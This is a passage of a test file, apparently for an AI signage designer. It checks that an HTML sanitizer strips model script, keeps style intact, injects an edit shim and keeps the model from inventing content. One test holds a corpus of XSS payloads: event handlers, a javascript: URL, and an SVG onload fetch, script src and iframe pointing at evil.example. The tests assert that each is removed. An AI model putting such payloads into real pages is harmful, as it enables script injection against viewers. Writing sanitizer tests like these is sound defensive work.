    const withScript = DOC.replace('</body>', '<script>var s=1;</script></body>');
    const { html } = sanitizeDesignerHtml(withScript);
    expect(html).toContain('<!doctype html>');
    expect(html).not.toContain('var s=1');
    expect(html).not.toMatch(/<script/i);
  });

  it('strips the malicious-payload corpus: on* handlers, javascript: URLs, SVG onload, meta refresh, nested frames', () => {
    const bad = DOC.replace(
      '</body>',
      '<img src="https://ok.example/x.png" onerror="parent.postMessage({type:\'educms-action\'},\'*\')">' +
      '<a href="javascript:alert(1)">tap</a>' +
      '<svg onload="fetch(\'https://evil.example\')"><circle r="4"/></svg>' +
      '<meta http-equiv="refresh" content="0;url=https://evil.example">' +
      '<div onclick=\'doEvil()\' onmouseover=doEvil2()>x</div>' +
      '<iframe src="https://evil.example"></iframe>' +
      '<base href="https://evil.example/">' +
      '</body>',
    );
    const { html } = sanitizeDesignerHtml(bad);
    expect(html).not.toMatch(/onerror|onclick|onmouseover|onload/i);
    expect(html).not.toMatch(/javascript:/i);
    expect(html).not.toMatch(/http-equiv\s*=\s*["']?refresh/i);
    expect(html).not.toMatch(/<iframe|<base/i);
    expect(html).not.toMatch(/<script/i);
    // The benign img + its https src survive.
    expect(html).toContain('https://ok.example/x.png');
  });

  it('strips markdown fences + leading prose before the doctype', () => {
    const wrapped = 'Here is your board:\n```html\n' + DOC + '\n```';
    const { html } = sanitizeDesignerHtml(wrapped);
    expect(html.startsWith('<!doctype html>')).toBe(true);
    expect(html).not.toContain('```');
    expect(html).not.toContain('Here is your board');
  });

  it('removes remote scripts + nested frames (remote-code / framing vectors)', () => {
    const bad = DOC.replace('</body>', '<script src="https://evil.example/x.js"></script><iframe src="https://evil.example"></iframe></body>');
    const { html } = sanitizeDesignerHtml(bad);
    expect(html).not.toMatch(/<script[^>]*src=/i);
    expect(html).not.toMatch(/<iframe/i);
  });

  it('throws on unusable input', () => {
    expect(() => sanitizeDesignerHtml('')).toThrow();
    expect(() => sanitizeDesignerHtml('nope')).toThrow();
    expect(() => sanitizeDesignerHtml(42 as unknown)).toThrow();
  });

  // 2026-09-23 — half a board used to pass (≥200 chars + a block tag): a vendor
  // that hit its output ceiling mid-document reached the picker. It is refused
  // now, with its own error class so generation can redraw it once.
  it('REJECTS a document cut off before it ended — and keeps the 200-char floor', () => {
    const cut = DOC.slice(0, DOC.indexOf('</body>'));
    expect(cut.length).toBeGreaterThan(200);
    expect(() => sanitizeDesignerHtml(cut)).toThrow(DesignerHtmlIncompleteError);
    expect(() => sanitizeDesignerHtml(cut)).toThrow(/never closes <\/html>/);
    // Closed </html> but an unclosed <body>: incomplete too.
    expect(() => sanitizeDesignerHtml(DOC.replace('</body>', ''))).toThrow(DesignerHtmlIncompleteError);
    // A cut-off answer that was fenced keeps its opening fence stripped and is still refused.
    expect(() => sanitizeDesignerHtml('```html\n' + cut)).toThrow(DesignerHtmlIncompleteError);
    // The floor is unchanged: a short fragment is still "not a usable document".
    expect(() => sanitizeDesignerHtml('<div>x</div>')).toThrow('Designer HTML is not a usable document.');
    // …and a whole document still passes.
    expect(sanitizeDesignerHtml(DOC).html).toContain('</html>');
  });

  it('flags Chromium-83-unsafe CSS as non-fatal warnings', () => {
    const taurusBad = '<!doctype html><html><head><style>.stage{width:1920px;height:1080px;position:relative;background:#111;color:#fff}'
      + '.bg{position:absolute;inset:0}.row{display:flex;gap:8px;align-items:center}</style></head>'
      + '<body><div class="stage"><div class="bg"></div><div class="row" data-field="t">Menu</div></div></body></html>';
    const { html, taurusWarnings } = sanitizeDesignerHtml(taurusBad);
    expect(html).toContain('<!doctype html>'); // not rejected — just warned
    expect(taurusWarnings.some((w) => w.includes('inset'))).toBe(true);
    expect(taurusWarnings.some((w) => w.includes('gap'))).toBe(true);
  });

  it('clean Taurus-safe HTML produces no warnings', () => {
    expect(auditDesignerHtmlTaurus(DOC)).toHaveLength(0);
  });

  it('allows gap on a GRID (Chromium 66+) and still flags it on a FLEX container', () => {
    const grid = '<style>.cards{display:grid;grid-template-columns:1fr 1fr;gap:28px}</style>';
    expect(auditDesignerHtmlTaurus(grid).some((w) => w.includes('gap'))).toBe(false);
    const flexElsewhere = '<style>.row{display:flex}.row{gap:8px}</style>';
    expect(auditDesignerHtmlTaurus(flexElsewhere).some((w) => w.includes('gap'))).toBe(true);
    const inlineFlex = '<div style="display:flex;gap:12px">x</div>';
    expect(auditDesignerHtmlTaurus(inlineFlex).some((w) => w.includes('gap'))).toBe(true);
  });
});

// The global SanitizationPipe (app.module.ts APP_PIPE) runs sanitize-html on
// every request-body string. A RAW `html` field is gutted by it (loses
// <!doctype>/<head>/<style>/<script>) — that bug truncated an 11,445-char
// board to a 3,022-char unstyled fragment on persist (2026-06-28). The fix:
// create-designer accepts `htmlBase64` instead. This locks in *why* — if a
// future refactor reverts to a raw html field, this test fails loudly.
describe('designer board persist — base64 transport survives the global sanitizer', () => {
  // mirror SanitizationPipe.sanitizeString exactly
  const pipe = (s: string) => sanitizeHtml(s, {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img']),
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, '*': ['style'] },
  });

  it('RAW html is destroyed by the pipe (the original bug)', () => {
    const gutted = pipe(DOC);
    expect(gutted.length).toBeLessThan(DOC.length);
    expect(gutted).not.toContain('<style>');
    expect(gutted).not.toContain('<!doctype html>');
  });

  it('placeholder', () => { expect(true).toBe(true); });
});

// Phase 4: the editability shim baked into AI Designer boards (EDUCMS-SHIM-V7
// since 2026-09-23; boards kept before that carry V6).
describe('injectDesignerEditShim', () => {
  const DOC = '<!doctype html><html><head><meta charset="utf-8"></head>'
    + '<body><div data-field="venue">Chrome</div><div data-imgslot="hero"></div></body></html>';
  const GUARD = 'if(e.source!==window.parent)return;';
  /** The V6 block a board kept before V7 carries: V7 minus the guard, under the V6 marker. */
  const V6_BLOCK = DESIGNER_EDIT_SHIM.replace(
    '/*EDUCMS-SHIM-V7*/',
    '/*EDUCMS-SHIM-V6*/',
  ).replace(GUARD, '');
  const withShimAt = (doc: string, anchor: string, block: string) =>
    doc.replace(anchor, () => block + anchor);

  it('the shim carries the V7 marker + the editability protocol', () => {
    expect(DESIGNER_EDIT_SHIM).toContain('EDUCMS-SHIM-V7');
    expect(DESIGNER_EDIT_SHIM).not.toContain('EDUCMS-SHIM-V6');
    expect(DESIGNER_EDIT_SHIM).toContain('educms-overrides');
    expect(DESIGNER_EDIT_SHIM).toContain('educms-field-click');
    expect(DESIGNER_EDIT_SHIM).toContain('educms-edit-mode');
    expect(
      DESIGNER_EDIT_SHIM.trim().startsWith('<script>/*EDUCMS-SHIM-V7*/'),
    ).toBe(true);
  });

  it('V7 hears its parent only: its ONE message listener opens with the source guard', () => {
    // Every other frame on a player page can reach the board as parent.frames[i];
    // only the board's parent (ExternalHtmlWidget / the builder) may drive it.
    expect(
      DESIGNER_EDIT_SHIM.split("addEventListener('message'").length - 1,
    ).toBe(1);
    expect(DESIGNER_EDIT_SHIM.split(GUARD).length - 1).toBe(1);
    expect(DESIGNER_EDIT_SHIM).toContain(
      `addEventListener('message',function(e){try{${GUARD}var d=e.data;`,
    );
    // ES5 / Chromium-83: the guard adds no arrow function, let or const.
    expect(GUARD).not.toMatch(/=>|\blet\b|\bconst\b/);
  });

  it('injects the shim before </head> and is idempotent', () => {
    const once = injectDesignerEditShim(DOC);
    expect(once).toContain('EDUCMS-SHIM-V7');
    // before </head>
    expect(once.indexOf('EDUCMS-SHIM-V7')).toBeLessThan(once.indexOf('</head>'));
    // re-injecting does nothing (no double shim)
    const twice = injectDesignerEditShim(once);
    expect(twice).toBe(once);
    // exactly ONE shim injected (the marker lives once, in the script's /*…*/ comment)
    expect(twice.split('EDUCMS-SHIM-V7').length - 1).toBe(1);
    expect(twice.split('<script>').length).toBe(once.split('<script>').length);
  });

  it('falls back to </body> when there is no head, and appends otherwise', () => {
    const noHead = '<body><div data-field="x">y</div></body>';
    const r = injectDesignerEditShim(noHead);
    expect(r).toContain('EDUCMS-SHIM-V7');
    expect(r.indexOf('EDUCMS-SHIM-V7')).toBeLessThan(r.indexOf('</body>'));
    const bare = '<div data-field="x">y</div>';
    expect(injectDesignerEditShim(bare)).toContain('EDUCMS-SHIM-V7');
  });

  it('UPGRADES a V6 board in place — the same spot, one shim, never two', () => {
    const savedV6 = withShimAt(DOC, '</head>', V6_BLOCK);
    const up = injectDesignerEditShim(savedV6);
    expect(up).toBe(withShimAt(DOC, '</head>', DESIGNER_EDIT_SHIM));
    expect(up).not.toContain('EDUCMS-SHIM-V6');
    expect(injectDesignerEditShim(up)).toBe(up); // and it is idempotent from there

    // A V6 that sat before </body> (the no-head fallback) is upgraded where it stands.
    const noHead = '<body><div data-field="x">y</div></body>';
    expect(
      injectDesignerEditShim(withShimAt(noHead, '</body>', V6_BLOCK)),
    ).toBe(withShimAt(noHead, '</body>', DESIGNER_EDIT_SHIM));
  });

  it('never leaves a V6 beside a V7: extra V6 copies are dropped, a stamped V6 is upgraded', () => {
    const twoV6 = withShimAt(
      withShimAt(DOC, '</head>', V6_BLOCK),
      '</body>',
      V6_BLOCK,
    );
    const a = injectDesignerEditShim(twoV6);
    expect(a.split('EDUCMS-SHIM-V7').length - 1).toBe(1);
    expect(a).not.toContain('EDUCMS-SHIM-V6');
    expect(a).toBe(withShimAt(DOC, '</head>', DESIGNER_EDIT_SHIM));

    const v7AndV6 = withShimAt(
      withShimAt(DOC, '</head>', DESIGNER_EDIT_SHIM),
      '</body>',
      V6_BLOCK,
    );
    expect(injectDesignerEditShim(v7AndV6)).toBe(
      withShimAt(DOC, '</head>', DESIGNER_EDIT_SHIM),
    );

    const stamped = withShimAt(
      DOC,
      '</head>',
      V6_BLOCK.replace('<script>', '<script nonce="abc123">'),
    );
    expect(injectDesignerEditShim(stamped)).toBe(
      withShimAt(DOC, '</head>', DESIGNER_EDIT_SHIM),
    );
  });

  it('refine ("Edit with words") strips whatever shim a board carries — V6 or V7 — before the model sees it', () => {
    expect(stripInjectedRuntime(withShimAt(DOC, '</head>', V6_BLOCK))).toBe(
      DOC,
    );
    expect(stripInjectedRuntime(injectDesignerEditShim(DOC))).toBe(DOC);
  });

  it('does nothing for non-string / empty input', () => {
    expect(injectDesignerEditShim('')).toBe('');
    expect(injectDesignerEditShim(undefined as unknown as string)).toBeUndefined();
  });
});

describe('designer base64 transport (cont.)', () => {
  const pipe = (s: string) => sanitizeHtml(s, {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img']),
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, '*': ['style'] },
  });
  it('base64 round-trips through the pipe untouched (the fix)', () => {
    const b64 = Buffer.from(DOC, 'utf8').toString('base64');
    expect(pipe(b64)).toBe(b64); // no tags → sanitize-html passes it through
    const decoded = Buffer.from(pipe(b64), 'base64').toString('utf8');
    expect(decoded).toBe(DOC);
    // and the decoded doc still passes the designer sanitizer with style
    // intact — while any model script is stripped (W0-02).
    const withScript = decoded.replace('</body>', '<style>.z{color:#0f0}</style><script>var s=1;</script></body>');
    const { html } = sanitizeDesignerHtml(withScript);
    expect(html).toContain('<style>');
    expect(html).not.toContain('var s=1');
  });
});

// The deterministic text auto-fit engine baked into every board (the 2026-06-29
// "jumbled hunk" fix): kills guessed pixel sizes that overflow/wrap/collide.
describe('VOS-FIT-ENGINE (injectDesignerLayoutEngine)', () => {
  const DOC = '<!doctype html><html><head><meta charset="utf-8"></head>'
    + '<body><div class="col"><div data-field="venue" data-fit data-fit-min="56">Chrome</div></div></body></html>';

  it('the engine carries the marker + fits [data-fit] by font-size (shrink-to-fit)', () => {
    expect(DESIGNER_LAYOUT_ENGINE).toContain('VOS-FIT-ENGINE');
    expect(DESIGNER_LAYOUT_ENGINE).toContain('data-fit');
    expect(DESIGNER_LAYOUT_ENGINE).toContain('scrollWidth');
    expect(DESIGNER_LAYOUT_ENGINE).toContain('data-fit-min');
    // It must re-run after web fonts load (they change widths late).
    expect(DESIGNER_LAYOUT_ENGINE).toContain('document.fonts');
    expect(DESIGNER_LAYOUT_ENGINE.trim().startsWith('<script>')).toBe(true);
  });

  it('injects before </body> and is idempotent', () => {
    const once = injectDesignerLayoutEngine(DOC);
    expect(once).toContain('VOS-FIT-ENGINE');
    expect(once.indexOf('VOS-FIT-ENGINE')).toBeLessThan(once.indexOf('</body>'));
    const twice = injectDesignerLayoutEngine(once);
    expect(twice).toBe(once); // no double-inject
    expect(twice.split('VOS-FIT-ENGINE').length - 1).toBe(1);
  });

  it('coexists with the edit shim (both present, in order) and is Taurus-safe', () => {
    const both = injectDesignerLayoutEngine(injectDesignerEditShim(DOC));
    expect(both).toContain('EDUCMS-SHIM-V7');
    expect(both).toContain('VOS-FIT-ENGINE');
    // No inset/gap shorthand in the engine (Chromium-83 player target).
    expect(/\binset\s*:/.test(DESIGNER_LAYOUT_ENGINE)).toBe(false);
    expect(/[^-]\bgap\s*:/.test(DESIGNER_LAYOUT_ENGINE)).toBe(false);
  });

  it('does nothing for empty / non-string input', () => {
    expect(injectDesignerLayoutEngine('')).toBe('');
    expect(injectDesignerLayoutEngine(undefined as unknown as string)).toBeUndefined();
  });
});

// The "sunset on a Domino's board" guard: a model-guessed stock-photo URL
// resolves to a random wrong image, so we strip it server-side. The data-imgslot
// stays so the platform can fill a real keyword-matched photo later.
describe('stripGuessedStockPhotos (no wrong photos)', () => {
  it('strips the src from an <img> on a stock host but keeps the slot', () => {
    const h = '<div class="photo"><img data-imgslot="hero" data-photo-query="pizza" src="https://images.unsplash.com/photo-1542281286-9e0a16bb7366?w=1600" alt=""></div>';
    const out = stripGuessedStockPhotos(h);
    expect(out).not.toContain('unsplash.com');
    expect(out).not.toMatch(/src\s*=/); // the guessed src is gone
    expect(out).toContain('data-imgslot="hero"'); // slot preserved for a real fill
    expect(out).toContain('data-photo-query="pizza"');
  });

  it('neutralizes an inline background-image using a stock host', () => {
    const h = '<div style="background-image:url(https://images.pexels.com/x.jpg);color:#fff">x</div>';
    const out = stripGuessedStockPhotos(h);
    expect(out).not.toContain('pexels.com');
    expect(out).toContain('background-image:none');
    expect(out).toContain('color:#fff'); // other styles untouched
  });

  it('leaves a same-origin / our-bucket image src alone', () => {
    const h = '<img data-img="logo" src="https://bhdaxzfalaycfopvcopm.supabase.co/storage/v1/object/public/assets/logo.png">';
    expect(stripGuessedStockPhotos(h)).toContain('supabase.co');
  });

  it('the sanitizer applies the strip end-to-end', () => {
    const doc = '<!doctype html><html><head><meta charset="utf-8">'
      + '<style>.stage{width:1920px;height:1080px;position:relative;background:#111;color:#fff}'
      + '.photo{position:absolute;top:0;right:0;bottom:0;width:600px;background:linear-gradient(160deg,#222,#000)}</style></head>'
      + '<body><div class="stage"><div class="hd" data-field="headline">Chrome Coffee</div>'
      + '<div class="photo" data-imgslot="hero" data-photo-query="latte"><img data-imgslot="hero" src="https://images.unsplash.com/photo-x?w=1600"></div>'
      + '</div></body></html>';
    const { html } = sanitizeDesignerHtml(doc);
    expect(html).not.toContain('unsplash.com');
    expect(html).toContain('data-imgslot="hero"');
  });
});

describe('summarizeHouseStyle — per-tenant style memory', () => {
  const board = (extra: string) =>
    '<!doctype html><html><head><style>.stage{width:1920px;height:1080px;background:#0b1f3a;color:#fff;font-family:Fraunces,serif}'
    + '.s{color:#ff6b35;font-family:Inter,sans-serif}' + extra
    + '</style></head><body><div class="stage"><div class="s">Hi there friend, this is long enough copy to pass the length floor.</div></div></body></html>';

  it('returns null when there is no usable signal', () => {
    expect(summarizeHouseStyle([])).toBeNull();
    expect(summarizeHouseStyle(['<div>too short</div>'])).toBeNull();
  });

  it('distills recurring palette + favored fonts from kept boards', () => {
    const out = summarizeHouseStyle([board(''), board('')]);
    expect(out).toBeTruthy();
    expect(out).toContain('HOUSE STYLE');
    expect(out).toContain('#0b1f3a'); // recurring brand field
    expect(out).toContain('#ff6b35'); // recurring accent
    expect(out).toContain('Fraunces'); // display face
    expect(out).toContain('Inter'); // body face
    expect(out).not.toMatch(/\bserif\b\s*\/|font-family/i); // generic keywords filtered out
  });

  it('detects motion tendency from @keyframes presence', () => {
    const moving = summarizeHouseStyle([board('@keyframes a{to{transform:scale(1.02)}}'), board('@keyframes b{to{opacity:1}}')]);
    expect(moving).toContain('subtle motion');
    const still = summarizeHouseStyle([board(''), board('')]);
    expect(still).toContain('mostly still');
  });

  it('buildDesignerUserPrompt embeds the house style when provided (and omits it otherwise)', () => {
    const hs = summarizeHouseStyle([board(''), board('')])!;
    const withHs = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080, houseStyle: hs });
    expect(withHs).toContain('HOUSE STYLE');
    const withoutHs = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080 });
    expect(withoutHs).not.toContain('HOUSE STYLE');
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// #268 item 2 — INTERPRETATION HEDGING: the brief-extraction contract.
// ═══════════════════════════════════════════════════════════════════════════
describe('brief extraction — prompt builders', () => {
  it('system prompt demands raw JSON with the exact contract fields', () => {
    const sys = buildBriefExtractionSystemPrompt();
    expect(sys).toContain('"occasion"');
    expect(sys).toContain('"headline"');
    expect(sys).toContain('"items"');
    expect(sys).toContain('"dateTime"');
    expect(sys).toContain('"tone"');
    expect(sys).toContain('"callToAction"');
    expect(sys).toMatch(/NEVER invent/i);
  });

  it('user prompt threads the brief + optional vertical/content', () => {
    const p = buildBriefExtractionUserPrompt({ prompt: 'happy hour board', vertical: 'bar', content: 'Draft beer 4' });
    expect(p).toContain('happy hour board');
    expect(p).toContain('bar');
    expect(p).toContain('Draft beer 4');
  });

  it('is a cheap, short-timeout pass by design', () => {
    expect(BRIEF_EXTRACTION_MAX_TOKENS).toBeLessThanOrEqual(500);
    expect(BRIEF_EXTRACTION_TIMEOUT_MS).toBeLessThanOrEqual(20_000);
  });
});

describe('parseDesignerBrief — defensive parse (must never throw)', () => {
  const validJson = JSON.stringify({
    occasion: 'happy hour',
    headline: 'Happy Hour Every Friday',
    items: ['House Margarita — $6', 'Loaded Nachos — $9'],
    dateTime: 'Fridays 4-6pm',
    tone: 'playful',
    callToAction: 'Come thirsty',
  });

  it('parses a clean JSON reply', () => {
    const b = parseDesignerBrief(validJson);
    expect(b).toEqual({
      occasion: 'happy hour',
      headline: 'Happy Hour Every Friday',
      items: ['House Margarita — $6', 'Loaded Nachos — $9'],
      dateTime: 'Fridays 4-6pm',
      tone: 'playful',
      callToAction: 'Come thirsty',
    });
  });

  it('strips markdown fences + leading/trailing prose', () => {
    const wrapped = 'Here you go:\n```json\n' + validJson + '\n```\nHope that helps!';
    const b = parseDesignerBrief(wrapped);
    expect(b?.headline).toBe('Happy Hour Every Friday');
  });

  it('returns null (never throws) on garbage, empty, or non-string input', () => {
    expect(parseDesignerBrief('')).toBeNull();
    expect(parseDesignerBrief('not json at all {{{')).toBeNull();
    expect(parseDesignerBrief(undefined)).toBeNull();
    expect(parseDesignerBrief(null)).toBeNull();
    expect(parseDesignerBrief(42)).toBeNull();
    expect(parseDesignerBrief('<!doctype html><html></html>')).toBeNull();
  });

  it('returns null for an all-empty brief (no signal = no value over skipping)', () => {
    expect(parseDesignerBrief(JSON.stringify({ occasion: '', headline: '', items: [], dateTime: '', tone: '', callToAction: '' }))).toBeNull();
  });

  it('truncates oversized fields and caps the items array, never fabricating', () => {
    const huge = JSON.stringify({
      occasion: 'x'.repeat(2000),
      headline: 'ok',
      items: Array.from({ length: 100 }, (_, i) => `item ${i}`),
      dateTime: '',
      tone: '',
      callToAction: '',
    });
    const b = parseDesignerBrief(huge)!;
    expect(b.occasion.length).toBeLessThanOrEqual(400);
    expect(b.items.length).toBeLessThanOrEqual(30);
  });

  it('drops non-string item entries instead of throwing', () => {
    const mixed = JSON.stringify({ occasion: 'x', headline: '', items: ['ok', 42, null, 'also ok'], dateTime: '', tone: '', callToAction: '' });
    const b = parseDesignerBrief(mixed)!;
    expect(b.items).toEqual(['ok', 'also ok']);
  });
});

describe('sanitizeClientDesignerBrief — re-validates a client-round-tripped brief', () => {
  it('accepts a well-formed client object', () => {
    const b = sanitizeClientDesignerBrief({
      occasion: 'happy hour',
      headline: 'Client Headline',
      items: ['Beer — $4'],
      dateTime: '',
      tone: 'playful',
      callToAction: '',
    });
    expect(b?.headline).toBe('Client Headline');
  });

  it('rejects non-object / malformed input without throwing', () => {
    expect(sanitizeClientDesignerBrief(null)).toBeNull();
    expect(sanitizeClientDesignerBrief(undefined)).toBeNull();
    expect(sanitizeClientDesignerBrief('a string')).toBeNull();
    expect(sanitizeClientDesignerBrief(42)).toBeNull();
  });

  it('applies the SAME truncation/shape rules as the extraction parser (defense in depth)', () => {
    const b = sanitizeClientDesignerBrief({ occasion: 'x'.repeat(2000), headline: '', items: [], dateTime: '', tone: '', callToAction: '' });
    expect(b?.occasion.length).toBeLessThanOrEqual(400);
  });
});

describe('formatBriefForPrompt + buildDesignerUserPrompt brief wiring', () => {
  const brief: DesignerBrief = {
    occasion: 'happy hour',
    headline: 'Happy Hour Every Friday',
    items: ['House Margarita — $6'],
    dateTime: 'Fridays 4-6pm',
    tone: 'playful',
    callToAction: 'Come thirsty',
  };

  it('formats every populated field, omits empty ones', () => {
    const text = formatBriefForPrompt(brief);
    expect(text).toContain('CONFIRMED BRIEF');
    expect(text).toContain('Happy Hour Every Friday');
    expect(text).toContain('House Margarita — $6');
    expect(text).toContain('Fridays 4-6pm');
    expect(text).toContain('Come thirsty');
    const noItems = formatBriefForPrompt({ ...brief, items: [], callToAction: '' });
    expect(noItems).not.toContain('Feature these items');
    expect(noItems).not.toContain('Call to action');
  });

  it('buildDesignerUserPrompt embeds the confirmed brief', () => {
    const p = buildDesignerUserPrompt({ prompt: 'happy hour board', width: 1920, height: 1080, brief });
    expect(p).toContain('CONFIRMED BRIEF');
    expect(p).toContain('Happy Hour Every Friday');
    // The per-candidate "content emphasis" is gone: candidates differ in layout.
    expect(p).not.toContain('CONTENT EMPHASIS');
  });

  it('omits the brief section when absent (backward compatible)', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080 });
    expect(p).not.toContain('CONFIRMED BRIEF');
  });

  it('gives every purpose three DISTINCT layouts for the candidate fan-out', () => {
    for (const purpose of ['menu', 'offer', 'event', 'announcement', 'welcome'] as const) {
      const ids = designerStructuresFor(purpose).map((st) => st.id);
      expect(ids).toHaveLength(3);
      expect(new Set(ids).size).toBe(3);
    }
    expect(designerStructuresFor('menu').map((st) => st.id)).toEqual(['rail-cards', 'hero-cards', 'leader-rows']);
    expect(designerStructuresFor('menu', 1)).toHaveLength(1);
  });
});

// ═══════════════════════════════════════════════════════════════════════════
// #268 item 4 — LEARN FROM REFINES: keyword-frequency heuristic distillation.
// ═══════════════════════════════════════════════════════════════════════════
describe('distillRefinePreferences — pure keyword-frequency heuristic', () => {
  it('returns [] for no signal / a single one-off instruction (not "recurring")', () => {
    expect(distillRefinePreferences([])).toEqual([]);
    expect(distillRefinePreferences(['make the headline bigger'])).toEqual([]);
  });

  it('surfaces a preference once it recurs 2+ times', () => {
    const prefs = distillRefinePreferences(['make the text bigger', 'the headline is too small to read']);
    expect(prefs.some((p) => /BIGGER/.test(p))).toBe(true);
  });

  it('caps output at 2 lines even with many recurring signals', () => {
    const instructions = [
      'make it bigger', 'too small to read',
      'less clutter please', 'too busy, simplify',
      'use our red', 'our brand color please',
      'make it darker', 'too light, darker theme',
    ];
    const prefs = distillRefinePreferences(instructions);
    expect(prefs.length).toBeLessThanOrEqual(2);
  });

  it('ranks the MOST recurring preference first', () => {
    const instructions = [
      'bigger text', 'too small', 'increase the size please', // 3 hits for "bigger"
      'less clutter', 'too busy', // 2 hits for "cleaner"
    ];
    const prefs = distillRefinePreferences(instructions);
    expect(prefs[0]).toMatch(/BIGGER/);
  });

  it('never throws on garbage input', () => {
    expect(distillRefinePreferences(null as unknown as string[])).toEqual([]);
    expect(distillRefinePreferences([42 as unknown as string, '', 'ok bigger please', 'too small'])).toBeTruthy();
  });
});

describe('summarizeHouseStyleWithRefines — combines keep-derived + refine-derived signal', () => {
  const board = (extra: string) =>
    '<!doctype html><html><head><style>.stage{width:1920px;height:1080px;background:#0b1f3a;color:#fff;font-family:Fraunces,serif}'
    + '.s{color:#ff6b35;font-family:Inter,sans-serif}' + extra
    + '</style></head><body><div class="stage"><div class="s">Hi there friend, this is long enough copy to pass the length floor.</div></div></body></html>';

  it('falls back to plain summarizeHouseStyle output when there are no refines', () => {
    const withRefines = summarizeHouseStyleWithRefines([board(''), board('')], []);
    const plain = summarizeHouseStyle([board(''), board('')]);
    expect(withRefines).toBe(plain);
  });

  it('appends a distilled refine-preference line onto the keep-derived house style', () => {
    const out = summarizeHouseStyleWithRefines([board(''), board('')], ['bigger text please', 'too small to read']);
    expect(out).toContain('HOUSE STYLE');
    expect(out).toContain('#0b1f3a'); // keep-derived signal still present
    expect(out).toMatch(/BIGGER/); // refine-derived signal appended
  });

  it('produces a house-style line from refines ALONE when there are no kept boards yet', () => {
    const out = summarizeHouseStyleWithRefines([], ['less clutter please', 'too busy, simplify']);
    expect(out).toContain('HOUSE STYLE');
    expect(out).toMatch(/CLEANER/);
  });

  it('returns null when NEITHER source has signal (matches summarizeHouseStyle null contract)', () => {
    expect(summarizeHouseStyleWithRefines([], [])).toBeNull();
    expect(summarizeHouseStyleWithRefines(['<div>too short</div>'], ['one-off, not recurring'])).toBeNull();
  });

  it('bounds prompt-lean growth — output stays roughly the same order of size as the base house style', () => {
    const base = summarizeHouseStyle([board(''), board('')])!;
    const withRefines = summarizeHouseStyleWithRefines(
      [board(''), board('')],
      ['bigger text please', 'too small to read', 'less clutter', 'too busy'],
    )!;
    // At most 2 short preference lines appended — not unbounded growth.
    expect(withRefines.length).toBeLessThan(base.length + 250);
  });
});

// ── FACTS + brief-beats-venue-type precedence (2026-08-25 incident) ──────
describe('FACTS in the designer prompt', () => {
  it('states the facts rule before layout and type', () => {
    expect(DESIGNER_SYSTEM_PROMPT.indexOf('FACTS')).toBeGreaterThan(-1);
    expect(DESIGNER_SYSTEM_PROMPT.indexOf('FACTS')).toBeLessThan(DESIGNER_SYSTEM_PROMPT.indexOf('LAYOUT'));
    expect(DESIGNER_SYSTEM_PROMPT.indexOf('FACTS')).toBeLessThan(DESIGNER_SYSTEM_PROMPT.indexOf('TYPE'));
  });

  it('no longer asks the model to invent items or offers', () => {
    // The literal instruction that produced "Burger $2.99 / Fries $3.00 /
    // DEAL - 2 for $6 - All Day" on a brief that named no prices.
    expect(DESIGNER_SYSTEM_PROMPT).not.toContain('believable items/offers');
    expect(DESIGNER_SYSTEM_PROMPT).not.toContain('invent sensible REAL-sounding content');
  });

  it('tells the model what to do when the facts are missing (leave the section out)', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toContain('Where a section has no supplied facts, that section is left out');
  });

  it('says a reference board\'s words, prices and photos are placeholders, never content for this board', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toContain("A reference board's words, prices and photos are placeholders (VENUE NAME, Menu Item One, $0.00, empty frames) and its colors are only tokens: none of them goes on this board.");
  });
});

describe('brief beats vertical (precedence)', () => {
  it('states an explicit precedence order before the brief', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080, vertical: 'qsr' });
    expect(p.indexOf('PRECEDENCE')).toBeGreaterThan(-1);
    expect(p.indexOf('PRECEDENCE')).toBeLessThan(p.indexOf('Brief:'));
    expect(p).toContain('it never overrides what they did say');
  });

  it('names the venue type as a fallback, not an instruction', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080, vertical: 'qsr' });
    expect(p).toContain('venue type: quick-service restaurant');
    expect(p).toContain('then last the venue type');
  });

  it('says the CONFIRMED BRIEF outranks the vertical', () => {
    const out = formatBriefForPrompt({
      occasion: 'welcome',
      headline: 'Welcome to Riverside',
      items: [],
      dateTime: '',
      tone: '',
      callToAction: '',
    });
    expect(out).toContain('OUTRANKS the venue type');
    expect(out).toContain('FACTS rule');
  });
});

// ── TAP TARGETS: the runtime emit must never silently disappear ────────────
//
// THE TRAP THIS GUARDS. The designer shim's header says it is "sourced VERBATIM
// from apps/web/scripts/inject-shim-v2.cjs (MARKER EDUCMS-SHIM-V6) so there is
// ONE runtime" — and that injector has ZERO `educms-action` emits. So the next
// agent who "re-syncs the one runtime", or who runs that injector over a board
// carrying this shim, would strip the tap dispatch and leave every AI-designed
// hot zone ARMED BUT DEAD: it looks like a button, it does nothing on tap, and
// nothing anywhere goes red. That is the exact silent-failure family the
// 2026-08-25 incident was about, so it gets a test instead of a comment.
describe('EDUCMS-SHIM-V7 — runtime tap dispatch', () => {
  it('emits educms-action so an AI-designed hot zone can actually fire', () => {
    expect(DESIGNER_EDIT_SHIM).toContain("type:'educms-action'");
  });

  it('reads the operator’s wired action map off the overrides message', () => {
    // WidgetRenderer.postDesignerOverrides already posts `actions`; before
    // 2026-08-25 this shim ignored it, so it never knew what was wired.
    expect(DESIGNER_EDIT_SHIM).toContain('applyActions(d.actions)');
  });

  it('never fires for a key the operator has not wired', () => {
    // The player also re-resolves the key against its own copy (W0-02), but the
    // board must not post a phantom tap either.
    expect(DESIGNER_EDIT_SHIM).toContain('var action=WIRED[key];');
  });

  it('gives an UNWIRED hot zone no tap affordance (never looks interactive while inert)', () => {
    expect(DESIGNER_EDIT_SHIM).toContain("el.style.cursor=on?'pointer':''");
  });

  it('never fires in edit mode (there a click configures the action instead)', () => {
    expect(DESIGNER_EDIT_SHIM).toContain('function onActionTap(e){try{if(editMode)return;');
  });

  it('never lets the BOARD choose a destination — it only names a key', () => {
    // The AI is structurally incapable of supplying a URL: it emits
    // data-action="<key>" and the player resolves the destination from the
